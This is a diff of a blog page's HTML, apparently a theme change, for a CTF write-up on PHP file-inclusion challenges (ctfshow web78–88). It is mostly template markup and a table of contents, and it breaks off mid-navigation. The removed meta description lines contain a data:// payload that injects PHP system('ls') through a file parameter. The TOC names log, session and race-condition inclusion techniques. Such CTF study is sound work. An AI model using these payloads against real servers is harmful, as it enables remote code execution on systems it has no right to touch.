@@ -1,18 +1,51 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="zh-CN">
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="这篇文章的知识点大部分已经移到另一篇文章了 0x02题目web78 典型的文件包含include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。 我们采用伪协议去做 php伪协议做法: 做法一:采用data伪协议 123?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#x27;ls&#x27;);?&gt;?file&#x3D;data:&#x2F;&#x2F;tex">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-bounce.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous" defer></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wanth3f1ag.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-dark","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+<script>
+  (function () {
+    var OriginTitle = document.title;
+    var titleTime;
+    document.addEventListener('visibilitychange', function () {
+      if (document.hidden) {
+        document.title = '坏人！看完了就想走' + OriginTitle;
+        clearTimeout(titleTime);
+      } else {
+        document.title = '(*´∇｀*)你回来啦~' + OriginTitle;
+        titleTime = setTimeout(function () {
+          document.title = OriginTitle;
+        }, 2000);
+      }
+    });
+  })();
+</script>
+
+    <meta name="description" content="web入门文件包含篇-ctfshow">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web入门文件包含篇-ctfshow">
 <meta property="og:url" content="https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/index.html">
 <meta property="og:site_name" content="root@wanth3f1ag">
-<meta property="og:description" content="这篇文章的知识点大部分已经移到另一篇文章了 0x02题目web78 典型的文件包含include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。 我们采用伪协议去做 php伪协议做法: 做法一:采用data伪协议 123?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&#x27;ls&#x27;);?&gt;?file&#x3D;data:&#x2F;&#x2F;tex">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="web入门文件包含篇-ctfshow">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730285657191-4bfa4190-aaad-47f5-bdd2-6eb3ad56f460.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730030606040-7bf50287-c040-4e27-b8e6-d2145f24eace.png">
@@ -39,180 +72,291 @@
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394008762-1f4d5086-c564-4870-bd5c-4a07dfd049ad.png">
 <meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730394986525-f1c33433-17cf-46fd-b824-e04ae1a7c1ed.png">
 <meta property="article:published_time" content="2024-12-03T06:29:06.000Z">
-<meta property="article:modified_time" content="2025-05-16T03:43:21.337Z">
+<meta property="article:modified_time" content="2025-12-01T11:07:53.642Z">
 <meta property="article:author" content="wanTh3flag">
 <meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>web入门文件包含篇-ctfshow</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
 
 
-    <!-- Umami Analytics -->
+<link rel="canonical" href="https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/">
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/","path":"2024/12/03/web入门文件包含篇-ctfshow/","title":"web入门文件包含篇-ctfshow"}</script>
 
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">H0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">A6out</a></li><!--
-     --><!--
-       --><li><a href="/tags/">T6gs</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Catagory</a></li><!--
-     --><!--
-       --><li><a href="/links/">L1nks</a></li><!--
-     --><!--
-       --><li><a href="/search/">s4arch</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2024/12/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2024/12/02/sqlmap%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E7%9A%84%E6%91%98%E5%BD%95/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&text=web入门文件包含篇-ctfshow"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&is_video=false&description=web入门文件包含篇-ctfshow"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=web入门文件包含篇-ctfshow&body=Check out this article: https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&title=web入门文件包含篇-ctfshow"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&name=web入门文件包含篇-ctfshow&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2024/12/03/web%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AF%87-ctfshow/&t=web入门文件包含篇-ctfshow"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text">0x02题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web78"><span class="toc-number">1.1.</span> <span class="toc-text">web78</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">php伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">data:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-number">1.1.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web79"><span class="toc-number">1.2.</span> <span class="toc-text">web79</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B9%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">php之&lt;?&#x3D; ?&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%87%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.</span> <span class="toc-text">采用大小写绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web80"><span class="toc-number">1.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web81"><span class="toc-number">1.4.</span> <span class="toc-text">web81</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.1.</span> <span class="toc-text">#日志文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web82"><span class="toc-number">1.5.</span> <span class="toc-text">web82</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.</span> <span class="toc-text">session文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Session%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">Session的工作原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">利用session.upload_progress进行文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BAsession%E6%96%87%E4%BB%B6%E5%91%A2%E3%80%82"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">如何创建session文件呢。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%90%8E%EF%BC%8Csession%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%AB%8B%E5%8D%B3%E6%B8%85%E7%A9%BA%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%A6%81%E6%83%B3%E5%8A%9E%E6%B3%95%E6%8A%8Asession%E7%95%99%E5%9C%A8%E9%87%8C%E9%9D%A2%EF%BC%8C%E6%89%80%E4%BB%A5%E5%B0%B1%E8%A6%81%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%EF%BC%8C%E5%9C%A8session%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B8%85%E7%A9%BA%E5%89%8D%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%80%9F%E5%8A%A9Burp-Suite"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">方法一 | 借助Burp Suite</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">产生条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PHP-SESSION-UPLOAD-PROGRESS%E5%8A%A0%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.5.3.</span> <span class="toc-text">利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web83"><span class="toc-number">1.6.</span> <span class="toc-text">web83</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">用脚本:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web84"><span class="toc-number">1.7.</span> <span class="toc-text">web84</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web85"><span class="toc-number">1.8.</span> <span class="toc-text">web85</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.1.</span> <span class="toc-text">file_get_contents()函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos-%E5%87%BD%E6%95%B0"><span class="toc-number">1.8.2.</span> <span class="toc-text">strpos()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web86"><span class="toc-number">1.9.</span> <span class="toc-text">web86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web87"><span class="toc-number">1.10.</span> <span class="toc-text">web87</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter-%E6%B5%81%E7%9A%84-base64-decode-%E6%96%B9%E6%B3%95"><span class="toc-number">1.10.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter 流的 base64-decode 方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-rot13-%E7%BC%96%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87"><span class="toc-number">1.10.2.</span> <span class="toc-text">通过 rot13 编码实现绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-strip-tags-%E5%87%BD%E6%95%B0%E5%8E%BB%E9%99%A4-XML-%E6%A0%87%E7%AD%BE"><span class="toc-number">1.10.3.</span> <span class="toc-text">通过 strip_tags 函数去除 XML 标签</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#strip-tags%E5%87%BD%E6%95%B0"><span class="toc-number">1.10.3.1.</span> <span class="toc-text">strip_tags函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web88"><span class="toc-number">1.11.</span> <span class="toc-text">web88</span></a></li></ol></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        web入门文件包含篇-ctfshow
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">wanTh3flag</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2024-12-03T06:29:06.000Z" class="dt-published" itemprop="datePublished">2024-12-03</time>
-        
-        (Updated: <time datetime="2025-05-16T03:43:21.337Z" class="dt-updated" itemprop="dateModified">2025-05-16</time>)
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a>
-    </div>
-
-
-    </div>
-  </header>
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>web入门文件包含篇-ctfshow | root@wanth3f1ag</title>
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <p>这篇文章的知识点大部分已经移到另一篇文章了</p>
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+  <script src="/js/third-party/pace.js" defer></script>
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">root@wanth3f1ag</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CTFer</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="s4arch" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-h0me"><a href="/" rel="section"><i class="home fa-fw"></i>H0me</a></li><li class="menu-item menu-item-a6out"><a href="/about/" rel="section"><i class="user fa-fw"></i>A6out</a></li><li class="menu-item menu-item-t6gs"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>T6gs</a></li><li class="menu-item menu-item-catagories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>Catagories</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="link fa-fw"></i>L1nks</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>s4arch
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02%E9%A2%98%E7%9B%AE"><span class="nav-number">1.</span> <span class="nav-text">0x02题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web78"><span class="nav-number">1.1.</span> <span class="nav-text">web78</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.1.1.</span> <span class="nav-text">php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#data-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">data:&#x2F;&#x2F;伪协议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input"><span class="nav-number">1.1.2.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web79"><span class="nav-number">1.2.</span> <span class="nav-text">web79</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E4%B9%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">php之&lt;?&#x3D; ?&gt;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%87%E7%94%A8%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">1.2.2.</span> <span class="nav-text">采用大小写绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web80"><span class="nav-number">1.3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web81"><span class="nav-number">1.4.</span> <span class="nav-text">web81</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.4.1.</span> <span class="nav-text">#日志文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web82"><span class="nav-number">1.5.</span> <span class="nav-text">web82</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.5.1.</span> <span class="nav-text">session文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Session%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">Session的工作原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 